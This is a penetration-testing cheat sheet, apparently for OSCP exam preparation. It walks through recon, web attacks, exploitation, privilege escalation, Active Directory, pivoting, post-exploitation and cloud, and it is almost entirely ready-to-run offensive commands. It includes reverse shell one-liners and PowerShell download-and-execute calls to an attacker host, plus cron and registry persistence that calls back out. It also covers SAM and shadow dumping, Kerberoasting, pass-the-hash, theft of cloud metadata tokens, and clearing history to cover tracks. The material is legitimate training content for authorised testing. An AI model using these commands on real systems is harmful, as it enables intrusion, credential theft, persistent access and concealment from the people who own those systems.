## Phase 1: Information Gathering & Reconnaissance

### 1.1 The 80/20 Initial Scan (Find the Easy Foothold Fast)
```bash
# 1. Host Discovery (Find the live ones)
nmap -sn 192.168.1.0/24 | grep "Nmap scan" | awk '{print $5}' > live_hosts.txt

# 2. Fast Port Scan (Top 1000 ports on all live hosts)
sudo masscan -iL live_hosts.txt -p1-1000 --rate=10000 -oG masscan-out.txt
grep -v "^#" masscan-out.txt | awk '{print $2, $4}' | tr ',' '\n' | awk '{print $1, $2}' | sort -u > ports.txt

# 3. Targeted Deep Scan (For hosts with interesting ports)
nmap -sC -sV -p $(grep $IP ports.txt | cut -d' ' -f2 | tr '\n' ',' | sed 's/,$//') $IP -oA deep_scan_$IP
```

### 1.2 Decision Tree: Where to Go Next
```
Found open port(s)?
    ├─ 80,443,8080,8443 → Go to Web Application Attacks
    ├─ 139,445          → Go to SMB Deep Dive
    ├─ 21               → Check for anonymous FTP (nmap --script ftp-anon)
    ├─ 22               → Grab banner (nc -nv $IP 22), attempt user:user login
    ├─ 25               → Check for VRFY/EXPN (smtp-user-enum)
    ├─ 3306,1433,1521   → Attempt default creds (root:root, sa:password)
    ├─ 389,636          → ldapsearch anonymously
    ├─ 2049             → showmount -e $IP
    ├─ 5985,5986        → Attempt WinRM with evil-winrm (if you have creds)
    └─ ???              → Run nmap -sV --version-intensity 9 on that port
```

### 1.3 Web Server Quick Wins (Before Full Directory Bruteforce)
```bash
curl -s -I http://$IP | grep -E "Server|X-Powered-By"
curl -s http://$IP/robots.txt
curl -s http://$IP/sitemap.xml
curl -s http://$IP/.well-known/security.txt
whatweb -a 3 http://$IP --log-verbose=whatweb.log
# Look for comments in HTML source
curl -s http://$IP | grep -E "<!--|--!>"
```

---

## Phase 2: Vulnerability Scanning (Lead Generation)

### 2.1 The "Just Find Me Something" Command
```bash
# Run this while you manually check services
nuclei -u http://$IP -t ~/nuclei-templates/ -severity critical,high -o nuclei_critical.txt &
nmap -sV --script vuln -p $(grep $IP ports.txt | cut -d' ' -f2 | tr '\n' ',' | sed 's/,$//') $IP -oN nmap_vuln.txt &
searchsploit --nmap deep_scan_$IP.xml | grep -v "No Results" > searchsploit_results.txt
```

### 2.2 Manual Verification is Mandatory
- **False Positive?** Always try to replicate the finding manually.
- **Version looks old?** `searchsploit -t $software $version | grep -v '/dos/'`

---

## Phase 3: Web Application Attacks (The Art of the Break-In)

### 3.1 Directory & File Fuzzing (The Right Way)
```bash
# Use ffuf for speed and recursion
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -e .php,.asp,.aspx,.txt,.bak,.old -recursion -recursion-depth 2 -c -t 100 -o ffuf_results.json

# For APIs
ffuf -u http://$IP/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

### 3.2 Parameter Discovery & Injection Points
```bash
# Use waybackurls to find historical parameters
waybackurls $IP | grep -E "\?.*=" | sort -u > params.txt

# Test for SQLi, XSS, LFI with a simple fuzzer
ffuf -u http://$IP/page.php?FUZZ=test -w params.txt -fc 404
sqlmap -m params.txt --batch --level 2 --risk 2
```

### 3.3 Common Vulnerability Confirmation Commands
```bash
# LFI Test
curl -s http://$IP/index.php?page=../../../../etc/passwd | grep root

# SQLi Test (Time-based)
curl -s "http://$IP/page.php?id=1' AND SLEEP(5)-- -"

# XSS Test
curl -s "http://$IP/search.php?q=<script>alert(1)</script>"

# Command Injection Test
curl -s "http://$IP/ping.php?ip=127.0.0.1; whoami"
```

---

## Phase 4: Exploitation (Getting the Shell)

### 4.1 Reverse Shell One-Liners (Keep These Handy)
```bash
# Bash
bash -i >& /dev/tcp/$LHOST/4444 0>&1

# Python (Linux)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

# PHP
php -r '$sock=fsockopen("$LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port 4444"
```

### 4.2 Metasploit Multi-Handler (Always Ready)
```bash
# Start a background listener for multiple payloads
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z"
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4445; set ExitOnSession false; exploit -j -z"
```

### 4.3 Quick Public Exploit Run
```bash
# Download, compile (if needed), and run
searchsploit -m $EDB_ID
# Check code for compilation instructions
gcc $EDB_ID.c -o exploit -lpthread
./exploit $IP $PORT
```

---

## Phase 5: Password Attacks (Credential Harvesting)

### 5.1 Online Brute Force (With Caution)
```bash
# Hydra for web forms (GET)
hydra -L users.txt -P pass.txt $IP http-get-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# Hydra for web forms (POST)
hydra -L users.txt -P pass.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Login failed"

# Medusa for SSH
medusa -h $IP -U users.txt -P pass.txt -M ssh
```

### 5.2 Hash Cracking (Fast and Effective)
```bash
# Identify hash
hashid -m '$hash$string'

# John
john --format=$format hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat (if you have GPU)
hashcat -m $mode -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 5.3 The "Low-Hanging Fruit" Credential Hunt
```bash
# On Linux (post-exploit)
grep -r "password" /home/* 2>/dev/null
grep -r "DB_PASSWORD" /var/www/ 2>/dev/null
find / -name "id_rsa" -o -name "*.kdbx" 2>/dev/null

# On Windows (post-exploit)
reg query HKLM /f password /t REG_SZ /s
dir /s *pass* == *cred* == *vnc* == *.config*
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Phase 6 & 7: Privilege Escalation (Linux & Windows)

### 6.1 The First 5 Commands (Always Run These)
**Linux:**
```bash
id && hostname && uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ps aux | grep root
```

**Windows:**
```cmd
whoami /all
systeminfo
net localgroup administrators
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v
```

### 6.2 Automated Transfer & Run (LinPEAS/WinPEAS)
```bash
# Attack machine
python3 -m http.server 80

# Victim (Linux)
wget http://$LHOST/linpeas.sh | sh
curl http://$LHOST/linpeas.sh | sh

# Victim (Windows)
certutil -urlcache -split -f http://$LHOST/winPEASany.exe winpeas.exe
.\winpeas.exe quiet cmd
```

### 6.3 Quick Wins & Known Exploit Chains
```bash
# Linux: Sudo/Root Shell (from GTFOBins)
sudo -l # If you see (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# Linux: SUID (from GTFOBins)
find . -exec /bin/sh -p \; -quit

# Windows: Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
# If found, compile malicious exe and place in path

# Windows: AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both 1, generate and run MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

---

## Phase 8: Active Directory (The Domain Game)

### 8.1 Enumeration (Noisy but Fast)
```bash
# From a Windows host, as a domain user
net user /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain

# Using CrackMapExec (from Kali with creds)
crackmapexec smb $DC_IP -u $USER -p $PASS --users
crackmapexec smb $DC_IP -u $USER -p $PASS --groups
crackmapexec smb $DC_IP -u $USER -p $PASS --shares
```

### 8.2 BloodHound (The God Tool)
```bash
# On target (run as domain user)
SharpHound.exe -c All
# Zip file back to Kali, load into BloodHound
# Queries to run: "Find Shortest Path to Domain Admins", "Find Principals with DCSync Rights"
```

### 8.3 Kerberoasting (One Command to Rule Them)
```bash
impacket-GetUserSPNs -request -dc-ip $DC_IP $DOMAIN/$USER:$PASS -outputfile kerberoast.hashes
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

### 8.4 Pass-the-Hash / Overpass-the-Hash
```bash
# Pass-the-Hash (SMB)
impacket-psexec -hashes :$NTLM_HASH $DOMAIN/$USER@$TARGET_IP

# Overpass-the-Hash (Generate Kerberos ticket)
impacket-getTGT -hashes :$NTLM_HASH $DOMAIN/$USER
export KRB5CCNAME=$USER.ccache
impacket-psexec $DOMAIN/$USER@$TARGET_IP -k -no-pass
```

---

## Phase 9: Pivoting & Tunneling (Moving Deeper)

### 9.1 SSH Dynamic Port Forwarding (The Swiss Army Knife)
```bash
# From Kali, through a Linux pivot
ssh -D 1080 -fN $USER@$PIVOT_IP
# Then use proxychains
proxychains nmap -sT -Pn $INTERNAL_IP

# Proxychains config (/etc/proxychains.conf)
# socks4 127.0.0.1 1080
```

### 9.2 SSHuttle (The VPN Over SSH)
```bash
# Routes all traffic for a subnet through the pivot
sshuttle -r $USER@$PIVOT_IP $INTERNAL_SUBNET/24
# Now just use tools directly: nmap $INTERNAL_IP
```

### 9.3 Chisel (For Firewall-Friendly Tunneling)
```bash
# On Kali (server)
./chisel server -p 8000 --reverse

# On Pivot (client, with outbound HTTPS allowed)
./chisel client $KALI_IP:8000 R:1080:socks
# Then use proxychains as above
```

---

## Phase 10: Post-Exploitation (The Clean Up)

### 10.1 Stabilize Your Shell (Linux)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Background (Ctrl+Z), then on Kali:
stty raw -echo; fg
export TERM=xterm-256color
# Fix window size issues later with: stty rows $rows cols $cols
```

### 10.2 Persistence (Quick and Quiet)
```bash
# Linux - Add SSH key
mkdir -p ~/.ssh && echo "$SSH_PUB_KEY" >> ~/.ssh/authorized_keys

# Linux - Cron job
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'") | crontab -

# Windows - Registry Run Key
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://$LHOST/rev.ps1'''))'"
```

### 10.3 Dump What Matters
```bash
# Linux - Shadow file
cat /etc/shadow
# Linux - History
cat ~/.bash_history ~/.zsh_history

# Windows - SAM (as admin)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### 10.4 Cover Your Tracks
```bash
# Linux - Clear bash history
history -c && echo > ~/.bash_history
# Windows - Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

---

## Phase 11: Cloud Security (If You End Up There)

### 11.1 Check for Cloud Metadata
```bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true

# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### 11.2 Check for Leaked Cloud Credentials
```bash
grep -r "aws_access_key_id" /home/* 2>/dev/null
grep -r "AZURE_CLIENT_SECRET" /var/www/ 2>/dev/null
env | grep -i -E "aws|azure|google"
```

---

## Appendix A: Essential One-Liners & Snippets

### A.1 Quick File Transfer (HTTP Server)
```bash
# On Kali (in directory with files to serve)
python3 -m http.server 8000
# On Linux target
wget http://$KALI_IP:8000/file
# On Windows target
certutil -urlcache -split -f http://$KALI_IP:8000/file.exe file.exe
```

### A.2 Quick File Transfer (SMB Server)
```bash
# On Kali
impacket-smbserver share $(pwd) -smb2support
# On Windows target
copy \\$KALI_IP\share\file.exe .
```

### A.3 Spawn TTY (Linux)
```bash
script /dev/null -c bash
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### A.4 Search for Writable Directories (Linux)
```bash
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'
```

### A.5 Search for Files with Specific Keywords (Windows)
```cmd
findstr /s /i /m "password" *.config *.txt *.xml *.ini
```

---

**Note to Self:** This cheat sheet is a living document. Update it with every new technique, every hard-earned lesson from the labs, and every command that saves you time in the exam. Speed comes from familiarity, and familiarity comes from repetition. Use this to move faster, but always think before you type.
```

This "Cheat Sheets" document is designed to be the high-speed, low-drag companion to your detailed playbooks. It prioritizes the most critical actions, provides decision-making logic, and organizes commands by phase, making it an invaluable tool during time-sensitive situations like the OSCP exam. Good luck!
